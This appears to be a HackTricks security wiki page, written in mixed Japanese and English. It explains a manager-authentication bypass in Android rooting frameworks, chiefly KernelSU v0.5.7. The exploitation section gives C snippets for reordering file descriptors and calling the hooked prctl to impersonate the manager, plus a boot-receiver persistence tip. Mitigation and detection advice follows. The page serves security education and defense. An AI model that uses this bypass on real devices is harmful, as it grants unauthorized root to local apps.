# Android Rooting Frameworks (KernelSU/Magisk) Manager Auth Bypass & Syscall Hook Abuse

{{#include ../../banners/hacktricks-training.md}}

KernelSU、APatch、SKRoot、Magisk などの Rooting frameworks は、Linux/Android kernel に patch を適用し、hook された syscall 経由で、権限のない userspace の「manager」app に privileged functionality を公開することがよくあります。manager-authentication の手順に欠陥がある場合、任意の local app がこの channel にアクセスし、すでに rooted された device 上で privileges を escalate できます。

このページでは、公開 research（特に Zimperium による KernelSU v0.5.7 の analysis）で明らかになった techniques と pitfalls を抽象化し、red team と blue team の双方が attack surfaces、exploitation primitives、堅牢な mitigations を理解できるようにします。<sup>[[1]](#references)</sup>

---
## Architecture pattern: syscall-hooked manager channel

- Kernel module/patch が syscall（一般的には prctl）を hook し、userspace からの "commands" を受け取る。
- Protocol は通常、magic_value、command_id、arg_ptr/len ... という形式。
- userspace の manager app が最初に authenticate する（例: CMD_BECOME_MANAGER）。kernel が caller を trusted manager としてマークすると、privileged commands が受け付けられる:
- caller に root を grant（例: CMD_GRANT_ROOT）
- su の allowlists/deny-lists を manage
- SELinux policy を adjust（例: CMD_SET_SEPOLICY）
- version/configuration を query
- 任意の app が syscalls を invoke できるため、manager authentication の正確性が critical になる。

Example（KernelSU design）:
- Hooked syscall: prctl
- KernelSU handler に divert するための magic value: 0xDEADBEEF
- Commands には CMD_BECOME_MANAGER、CMD_GET_VERSION、CMD_ALLOW_SU、CMD_SET_SEPOLICY、CMD_GRANT_ROOT などが含まれる。

---
## KernelSU v0.5.7 authentication flow (as implemented)

userspace が prctl(0xDEADBEEF, CMD_BECOME_MANAGER, data_dir_path, ...) を call すると、KernelSU は以下を verify します:

1) Path prefix check
- 提供された path は caller UID に対応する expected prefix で始まらなければならない。例: /data/data/<pkg> または /data/user/<id>/<pkg>。
- Reference: core_hook.c (v0.5.7) path prefix logic.<sup>[[2]](#references)</sup>

2) Ownership check
- path は caller UID によって owned されていなければならない。
- Reference: core_hook.c (v0.5.7) ownership logic.<sup>[[2]](#references)</sup>

3) APK signature check via FD table scan
- calling process の open file descriptors（FDs）を iterate する。
- path が /data/app/*/base.apk に一致する最初の file を選択する。
- APK v2 signature を parse し、official manager certificate に対して verify する。
- References: manager.c（FDs の iterating）、apk_sign.c（APK v2 verification）。<sup>[[3]](#references)[[4]](#references)</sup>

すべての checks に pass すると、kernel は manager の UID を一時的に cache し、reset されるまでその UID からの privileged commands を accept します。

---
## Vulnerability class: trusting “the first matching APK” from FD iteration

signature check が process の FD table で見つかった "the first matching /data/app/*/base.apk" に bind されている場合、実際には caller 自身の package を verify していません。attacker は、正規に signed された APK（real manager のもの）をあらかじめ配置し、自身の base.apk より先に FD list に現れるようにできます。

この trust-by-indirection により、unprivileged app は manager の signing key を所有せずに manager を impersonate できます。<sup>[[1]](#references)</sup>

Exploited される key properties:<sup>[[1]](#references)</sup>
- FD scan は caller の package identity に bind されず、path strings の pattern-matching のみを行う。
- open() は利用可能な最も小さい FD を return する。先に低い番号の FDs を close することで、attacker は ordering を control できる。
- filter は path が /data/app/*/base.apk に一致することだけを check し、それが caller の installed package に対応しているかは check しない。

---
## Attack preconditions

- device がすでに vulnerable な Rooting framework（例: KernelSU v0.5.7）で rooted されている。
- attacker が local で任意の unprivileged code（Android app process）を run できる。
- real manager がまだ authenticate していない（例: reboot 直後）。一部の frameworks は success 後に manager UID を cache するため、race に勝つ必要がある。<sup>[[1]](#references)</sup>

---
## Exploitation outline (KernelSU v0.5.7)

High-level steps:<sup>[[1]](#references)[[9]](#references)</sup>
1) prefix と ownership checks を satisfy するため、自分の app data directory への valid path を build する。
2) genuine KernelSU Manager base.apk が、自身の base.apk より低い番号の FD で open されるようにする。
3) prctl(0xDEADBEEF, CMD_BECOME_MANAGER, <your_data_dir>, ...) を invoke して checks を pass する。
4) CMD_GRANT_ROOT、CMD_ALLOW_SU、CMD_SET_SEPOLICY などの privileged commands を issue し、elevation を persist させる。

Practical notes on step 2 (FD ordering):<sup>[[1]](#references)</sup>
- /proc/self/fd symlinks を walk して、自分の /data/app/*/base.apk に対する process の FD を identify する。
- low FD（例: stdin、fd 0）を close し、legitimate manager APK を先に open して fd 0（または自身の base.apk fd より低い任意の index）を occupy させる。
- legitimate manager APK を app に bundle し、その path が kernel の naive filter を satisfy するようにする。例えば、/data/app/*/base.apk に一致する subpath の下に配置する。

Example code snippets (Android/Linux, illustrative only):

Enumerate open FDs to locate base.apk entries:
```c
#include <dirent.h>
#include <stdio.h>
#include <unistd.h>
#include <string.h>

int find_first_baseapk_fd(char out_path[PATH_MAX]) {
DIR *d = opendir("/proc/self/fd");
if (!d) return -1;
struct dirent *e; char link[PATH_MAX]; char p[PATH_MAX];
int best_fd = -1;
while ((e = readdir(d))) {
if (e->d_name[0] == '.') continue;
int fd = atoi(e->d_name);
snprintf(link, sizeof(link), "/proc/self/fd/%d", fd);
ssize_t n = readlink(link, p, sizeof(p)-1);
if (n <= 0) continue; p[n] = '\0';
if (strstr(p, "/data/app/") && strstr(p, "/base.apk")) {
if (best_fd < 0 || fd < best_fd) {
best_fd = fd; strncpy(out_path, p, PATH_MAX);
}
}
}
closedir(d);
return best_fd; // First (lowest) matching fd
}
```
番号の小さい FD が正規の manager APK を指すように強制する：
```c
#include <fcntl.h>
#include <unistd.h>

void preopen_legit_manager_lowfd(const char *legit_apk_path) {
// Reuse stdin (fd 0) if possible so the next open() returns 0
close(0);
int fd = open(legit_apk_path, O_RDONLY);
(void)fd; // fd should now be 0 if available
}
```
prctl hookによるManager認証:
```c
#include <sys/prctl.h>
#include <stdint.h>

#define KSU_MAGIC          0xDEADBEEF
#define CMD_BECOME_MANAGER 0x100  // Placeholder; command IDs are framework-specific

static inline long ksu_call(unsigned long cmd, unsigned long arg2,
unsigned long arg3, unsigned long arg4) {
return prctl(KSU_MAGIC, cmd, arg2, arg3, arg4);
}

int become_manager(const char *my_data_dir) {
long result = -1;
// arg2: command, arg3: pointer to data path (userspace->kernel copy), arg4: optional result ptr
result = ksu_call(CMD_BECOME_MANAGER, (unsigned long)my_data_dir, 0, 0);
return (int)result;
}
```
成功後の特権コマンド（例）:
- CMD_GRANT_ROOT: 現在のプロセスを root に昇格
- CMD_ALLOW_SU: 永続的な su の allowlist に自身の package/UID を追加
- CMD_SET_SEPOLICY: framework がサポートする範囲で SELinux policy を調整

Race/persistence tip:
- AndroidManifest に BOOT_COMPLETED receiver（RECEIVE_BOOT_COMPLETED）を登録し、再起動後早期に起動して、正規の manager より先に認証を試行する。<sup>[[1]](#references)</sup>

---
## Detection and mitigation guidance

framework 開発者向け:
- 認証を任意の FD ではなく、呼び出し元の package/UID に紐付ける:
- UID から呼び出し元の package を解決し、FD をスキャンするのではなく、PackageManager 経由でインストール済み package の signature と照合する。
- kernel-only の場合は、安定した呼び出し元 identity（task creds）を使用し、プロセス FD ではなく、init/userspace helper が管理する安定した source of truth に対して検証する。
- identity として path-prefix チェックを使用しない。呼び出し元が容易に満たせるためである。
- channel 上で nonce ベースの challenge–response を使用し、boot 時または重要なイベント発生時に、cache された manager identity を消去する。
- 可能な場合は、generic syscalls に過度な役割を持たせるのではなく、binder ベースの authenticated IPC を検討する。

defenders/blue team 向け:
- rooting frameworks と manager processes の存在を検出する。kernel telemetry が利用できる場合は、疑わしい magic constants（例: 0xDEADBEEF）を伴う prctl calls を監視する。
- 管理対象 fleet では、boot 後すぐに特権 manager commands を繰り返し試行する untrusted packages の boot receivers をブロックするか、alert を生成する。
- devices が patched framework versions に更新されていることを確認し、update 時に cache された manager IDs を無効化する。

攻撃の制限:
- 脆弱な framework によってすでに rooted されている devices にのみ影響する。
- 通常、正規の manager が認証される前の reboot/race window が必要となる（一部の frameworks は reset まで manager UID を cache する）。

---
## Related notes across frameworks

- Password-based auth（例: 過去の APatch/SKRoot builds）は、password が推測または brute-force 可能な場合や、validation にバグがある場合、弱い可能性がある。<sup>[[1]](#references)[[6]](#references)[[7]](#references)</sup>
- Package/signature-based auth（例: KernelSU）は原理上より強固だが、FD scans のような間接的な artefacts ではなく、実際の呼び出し元に紐付ける必要がある。<sup>[[1]](#references)[[5]](#references)</sup>
- Magisk: CVE-2024-48336 (MagiskEoP) は、成熟した ecosystem であっても identity spoofing の影響を受け、manager context 内で root 権限による code execution につながる可能性があることを示した。<sup>[[1]](#references)[[8]](#references)</sup>

---
## References

- [1] [Zimperium – The Rooting of All Evil: Security Holes That Could Compromise Your Mobile Device](https://zimperium.com/blog/the-rooting-of-all-evil-security-holes-that-could-compromise-your-mobile-device)
- [2] [KernelSU v0.5.7 – core_hook.c path checks (L193, L201)](https://github.com/tiann/KernelSU/blob/v0.5.7/kernel/core_hook.c#L193)
- [3] [KernelSU v0.5.7 – manager.c FD iteration/signature check (L43+)](https://github.com/tiann/KernelSU/blob/v0.5.7/kernel/manager.c#L43)
- [4] [KernelSU – apk_sign.c APK v2 verification (main)](https://github.com/tiann/KernelSU/blob/main/kernel/apk_sign.c#L319)
- [5] [KernelSU project](https://kernelsu.org/)
- [6] [APatch](https://github.com/bmax121/APatch)
- [7] [SKRoot](https://github.com/abcz316/SKRoot-linuxKernelRoot)
- [8] [MagiskEoP – CVE-2024-48336](https://github.com/canyie/MagiskEoP)
- [9] [KSU PoC demo video (Wistia)](https://zimperium-1.wistia.com/medias/ep1dg4t2qg?videoFoam=true)

{{#include ../../banners/hacktricks-training.md}}
